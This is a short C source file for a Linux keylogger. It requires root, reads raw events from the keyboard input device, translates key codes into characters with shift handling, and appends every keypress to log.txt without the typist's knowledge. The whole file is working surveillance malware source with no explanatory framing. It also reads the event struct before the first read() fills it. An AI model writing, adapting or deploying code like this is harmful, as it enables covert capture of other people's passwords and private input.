#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <stdint.h>
 
 
#define KEY_PRESSED 1
 
 
char* convertEventCode(uint16_t code, int shifted){
	static char *strings[] = {"","[esc]","1","2","3","4","5","6","7","8","9","0","-","=","[backspace]","[tab]","q","w","e","r","t","y","u"
    	,"i","o","p","[","]","[enter]","[lctrl]","a","s","d","f","g","h","j","k","l",";","'","`","[lshift]","\\","z","x","c","v","b","n","m",",",".","/","[rshift]","[kp*]","[lalt]",
    	" ","[caps]","[f1]","[f2]","[f3]","[f4]","[f5]","[f6]","[f7]","[f8]","[f9]","[f10]","[numlock]","[scrolllock]","[kp7]","[kp8]","[kp9]","[kp-]","[kp4]","[kp5]","[kp6]",
    	"[kp+]","[kp1]","[kp2]","[kp3]","[kp0]","[kp.]","[?]","[?]","[f11]","[f12]"};
 
 
	static char *STRINGS[] = {"","[esc]","!","@","#","$","%","^","&","*","(",")","_","+","[backspace]","[tab]","Q","W","E","R","T","Y","U"
    	,"I","O","P","{","}","[enter]","[lctrl]","A","S","D","F","G","H","J","K","L",":","\"","~","[lshift]","|","Z","X","C","V","B","N","M","<",">","?","[rshift]","[kp*]","[lalt]",
    	" ","[caps]","[f1]","[f2]","[f3]","[f4]","[f5]","[f6]","[f7]","[f8]","[f9]","[f10]","[numlock]","[scrolllock]","[kp7]","[kp8]","[kp9]","[kp-]","[kp4]","[kp5]","[kp6]",
    	"[kp+]","[kp1]","[kp2]","[kp3]","[kp0]","[kp.]","[?]","[?]","[f11]","[f12]"};
	if(code <=88 && code>=0){
    	if(shifted)
        	return STRINGS[code];
    	else
        	return strings[code];
	}else{
    	return "[Unsupported key]";
	}
   
}
 
 
int main(void){
	struct input_event event;
	int fd,rd, shift = 0;
	uid_t pid;
	pid = getuid();
   
	if(pid!=0){
    	printf("Requires Root Access\n");
    	return -1;
	}
   
	fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY | O_NONBLOCK);
 
 
	if(fd==-1){
    	printf("errno = %d\n",errno);
    	return -1;  
	}
	ssize_t size = 0;    
 
	FILE* log = fopen("log.txt","a");
	while((size>-1) || errno == EAGAIN || errno == EWOULDBLOCK){
    	if(event.type == EV_KEY){
        	if(event.value == KEY_PRESSED){
            	char *value = convertEventCode(event.code, shift);  
            	fprintf(log,"%s",value);
            	fflush(log);
            	if(event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT){
                	shift++;
            	}
        	}
        	if(event.value == 0 ){
            	if(event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT){
                	shift--;
            	}
        	}
    	}
    	size = read(fd,&event,sizeof(event));
	}
	fclose(log);
	printf("errno = %d\n",errno);
 
}
